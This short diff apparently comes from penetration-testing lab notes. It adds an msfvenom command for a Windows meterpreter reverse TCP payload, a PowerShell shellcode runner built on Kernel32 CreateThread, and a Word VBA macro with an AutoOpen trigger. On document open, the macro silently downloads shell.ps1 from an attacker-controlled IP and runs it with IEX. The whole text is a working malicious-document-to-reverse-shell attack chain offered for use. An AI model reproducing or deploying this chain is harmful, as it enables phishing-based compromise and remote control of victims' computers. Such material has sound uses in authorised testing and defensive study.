@@ -1,3 +1,9 @@
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.232 LPORT=4444 EXITFUNC=thread -f ps1
+
+# Open msfconsole multi.handler
+
+# Shell.ps1
+
 $Kernel32 = @"
 using System;
 using System.Runtime.InteropServices;
@@ -22,11 +28,16 @@ $size = $buf.Length
 $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
 [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
 
-// Macro Script
+// Macro Script -> Save as doc
 
 Sub MyMacro()
 Dim str As String
-str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.45.238/shell.ps1') | IEX"
+str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.45.232/shell.ps1') | IEX"
 Shell str, vbHide
 End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
 
